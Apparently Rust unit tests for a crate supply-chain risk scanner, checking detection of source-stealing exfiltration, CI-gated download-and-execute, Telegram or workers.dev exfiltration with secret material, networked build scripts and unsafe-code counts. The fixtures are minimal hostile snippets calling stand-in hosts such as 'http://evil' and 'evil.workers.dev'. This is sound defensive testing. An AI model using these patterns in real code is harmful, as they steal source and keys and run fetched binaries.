    #[test]
    fn source_exfil_conjunction_must_hold_in_one_file() {
        // scans-source alone -> not the fingerprint (legit codegen helper).
        let only_scan = scratch_crate(
            "scan",
            &[(
                "codegen.rs",
                "let _ = std::fs::read_dir(\".\"); let x = \".rs\";",
            )],
        );
        assert!(scan_source_exfil(&only_scan)
            .and_then(|s| s.source_exfil_sample)
            .is_none());
        let _ = std::fs::remove_dir_all(&only_scan);

        // CROSS-FILE: one file scans `.rs` sources, a *separate* file uses
        // reqwest. A benign crate (codegen + HTTP client) must NOT be flagged.
        // This is the false-attribution bug the per-file conjunction fixes.
        let cross = scratch_crate(
            "cross",
            &[
                (
                    "codegen.rs",
                    "fn g(){ let _=std::fs::read_dir(\".\"); let _=\".rs\"; }",
                ),
                (
                    "client.rs",
                    "fn f(){ let _ = reqwest::blocking::get(\"http://x\"); }",
                ),
            ],
        );
        assert!(
            scan_source_exfil(&cross)
                .and_then(|s| s.source_exfil_sample)
                .is_none(),
            "cross-file scan + network must NOT fire (benign codegen + HTTP client)"
        );
        let _ = std::fs::remove_dir_all(&cross);

        // SINGLE FILE doing both -> the real faster_log/async_println pattern.
        let bad = scratch_crate(
            "bad",
            &[(
                "steal.rs",
                "fn s(){ for e in std::fs::read_dir(\".\").unwrap(){ let _=\".rs\"; \
                 let _=reqwest::blocking::get(\"http://evil\"); } }",
            )],
        );
        let scan = scan_source_exfil(&bad).expect("scan");
        assert!(
            scan.source_exfil_sample.is_some(),
            "single-file scan+network IS the fingerprint"
        );
        assert!(scan.source_exfil_network);
        let _ = std::fs::remove_dir_all(&bad);
    }

    #[test]
    fn env_gated_requires_causal_proximity() {
        // Tight (rustdecimal shape): env gate, download, and spawn within a few
        // lines of one block -> flagged.
        let tight = "fn run() {\n    if std::env::var(\"GITLAB_CI\").is_ok() {\n        \
                     let _ = reqwest::blocking::get(\"http://x/p.bin\");\n        \
                     std::process::Command::new(\"/tmp/p.bin\").status();\n    }\n}\n";
        assert!(
            env_gated_block(tight),
            "tight download-and-execute must be flagged"
        );

        // Scattered (large-CLI false positive): the same three primitives exist but
        // hundreds of lines apart, causally unrelated -> NOT flagged.
        let mut scattered = String::from("let _cfg = std::env::var(\"APP_RPC\");\n");
        scattered.push_str(&"// unrelated code\n".repeat(80));
        scattered.push_str("let _ = reqwest::blocking::get(\"https://rpc.example\");\n");
        scattered.push_str(&"// unrelated code\n".repeat(80));
        scattered.push_str("std::process::Command::new(resolve_cargo_binary()).status();\n");
        assert!(
            !env_gated_block(&scattered),
            "unrelated env/network/spawn scattered across a large file must NOT be flagged"
        );
    }

    #[test]
    fn dual_use_service_domain_needs_secret_corroboration() {
        // A purpose-built integration crate hitting its own service (Telegram) with
        // no secret handling must NOT be flagged just for talking to its API.
        let benign = scratch_crate(
            "tg_benign",
            &[(
                "lib.rs",
                "pub fn send(){ let _=reqwest::blocking::get(\"https://api.telegram.org/bot1/sendMessage\"); }",
            )],
        );
        assert!(
            scan_source_exfil(&benign)
                .and_then(|s| s.exfil_domain)
                .is_none(),
            "a telegram crate must not trip the domain signal without the exfil shape"
        );
        let _ = std::fs::remove_dir_all(&benign);

        // Same service domain + secret material in the file -> the exfil shape.
        let exfil = scratch_crate(
            "tg_exfil",
            &[(
                "lib.rs",
                "pub fn steal(){ let _k=\"private_key\"; let _=reqwest::blocking::get(\"https://api.telegram.org/bot/x\"); }",
            )],
        );
        assert!(
            scan_source_exfil(&exfil)
                .and_then(|s| s.exfil_domain)
                .is_some(),
            "telegram + secret handling IS the exfil shape"
        );
        let _ = std::fs::remove_dir_all(&exfil);

        // A pure exfil host has no legitimate hardcoding -> flagged regardless.
        let host = scratch_crate(
            "cf_exfil",
            &[(
                "lib.rs",
                "pub fn x(){ let _=reqwest::blocking::get(\"https://evil.workers.dev/c\"); }",
            )],
        );
        assert!(
            scan_source_exfil(&host)
                .and_then(|s| s.exfil_domain)
                .is_some(),
            "a pure exfil host is suspicious on its own"
        );
        let _ = std::fs::remove_dir_all(&host);
    }

    #[test]
    fn evidence_sample_is_walk_order_independent() {
        // Two source files both carry the `unsafe` marker. The chosen evidence
        // path must be the lexicographically-first matching file (`a_first.rs`),
        // never whichever one `read_dir` happens to yield first — otherwise
        // --no-timestamp output would differ across filesystems. `sorted_dir_entries`
        // makes the walk reproducible, so the sample is deterministic.
        let dir = scratch_crate(
            "unsafe_det",
            &[
                ("z_last.rs", "pub unsafe fn z() { unsafe {} }"),
                ("a_first.rs", "pub unsafe fn a() { unsafe {} }"),
            ],
        );
        let (stats, sample) = count_unsafe(&dir).expect("unsafe found in the crate");
        assert!(stats.total >= 2, "both files' unsafe should be counted");
        assert!(
            sample.ends_with("a_first.rs"),
            "evidence sample must be the lexicographically-first match, was {sample:?}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn sorted_dir_entries_is_lexicographic() {
        let dir = scratch_crate(
            "sorted_entries",
            &[("c.rs", "x"), ("a.rs", "x"), ("b.rs", "x")],
        );
        let names: Vec<String> = sorted_dir_entries(&dir.join("src"))
            .iter()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["a.rs", "b.rs", "c.rs"]);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn benign_build_script_is_not_suspicious() {
        // The legit cc-style fixture: only emits link directives.
        let src = "fn main() {\n    println!(\"cargo:rustc-link-lib=ssl\");\n}\n";
        assert!(build_script_intent_signal("openssl-sys@0.9.99", src, "build.rs".into()).is_none());
    }

    #[test]
    fn network_build_script_is_high() {
        let src = "fn main(){ let _ = reqwest::blocking::get(\"http://evil/x\"); }";
        let sig = build_script_intent_signal("evil@1.0.0", src, "build.rs".into()).unwrap();
        assert_eq!(sig.id, "build_script_suspicious");
        assert_eq!(sig.severity, Severity::High);
        assert!(sig
            .evidence
            .iter()
            .any(|e| e.summary.contains("network access")));
    }

    #[test]
    fn payload_build_script_is_medium() {
        let src = "fn main(){ let p = include_bytes!(\"blob.bin\"); let _ = p; }";
        let sig = build_script_intent_signal("sneaky@1.0.0", src, "build.rs".into()).unwrap();
        assert_eq!(sig.severity, Severity::Medium);
        assert!(sig.evidence.iter().any(|e| e.summary.contains("payload")));
    }

    #[test]
    fn detects_multiple_versions() {
        let model = lock(vec![pkg("foo", "1.0.0", false), pkg("foo", "2.0.0", false)]);
        let mut signals = vec![];
        collect_multiple_versions(&model, &mut signals);
        assert_eq!(
            signals
                .iter()
                .filter(|s| s.id == "multiple_versions_same_crate")
                .count(),
            2
        );
    }

    #[test]
    fn unsafe_scan_counts_only_real_code() {
        assert_eq!(scan_unsafe("unsafe { *p }").total, 1);
        assert_eq!(scan_unsafe("no danger here").total, 0);
        // `unsafely` is not the keyword; `// unsafe` is a comment -> 0.
        assert_eq!(scan_unsafe("let unsafely = 1; // unsafe").total, 0);
    }

    #[test]
    fn unsafe_scan_ignores_comments_and_strings() {
        let src = r##"
            // unsafe in a line comment
            /* unsafe in a block /* nested unsafe */ comment */
            let s = "this unsafe is a string";
            let r = r#"raw unsafe"#;
            fn real() { unsafe { } }
        "##;
        let st = scan_unsafe(src);
        assert_eq!(st.total, 1, "only the real unsafe block counts, got {st:?}");
        assert_eq!(st.blocks, 1);
    }

    #[test]
    fn unsafe_scan_categorizes() {
        let src = "unsafe fn a(){} unsafe impl T for U {} unsafe trait W {} fn b(){ unsafe { } }";
        let st = scan_unsafe(src);
        assert_eq!(st.total, 4);
        assert_eq!(st.fns, 1);
        assert_eq!(st.impls, 1);
        assert_eq!(st.traits, 1);
        assert_eq!(st.blocks, 1);
        assert_eq!(st.breakdown(), "4 (1 fn, 1 impl, 1 trait, 1 block)");
    }

    #[test]
    fn unsafe_scan_handles_char_literal_with_quote() {
        // The '"' char literal must not flip the scanner into string mode.
        let src = "let q = '\"'; unsafe { }";
        assert_eq!(scan_unsafe(src).total, 1);
    }

    #[test]
    fn sort_is_severity_descending() {
        let mut signals = vec![
            RiskSignal {
                id: "a".into(),
                package: "p".into(),
                severity: Severity::Low,
                weight: 1,
                confidence: 1.0,
                evidence: vec![],
                recommendation: String::new(),
            },
            RiskSignal {
                id: "b".into(),
                package: "p".into(),
                severity: Severity::High,
                weight: 1,
                confidence: 1.0,
                evidence: vec![],
                recommendation: String::new(),
            },
        ];
        sort_signals(&mut signals);
        assert_eq!(signals[0].severity, Severity::High);
    }
}
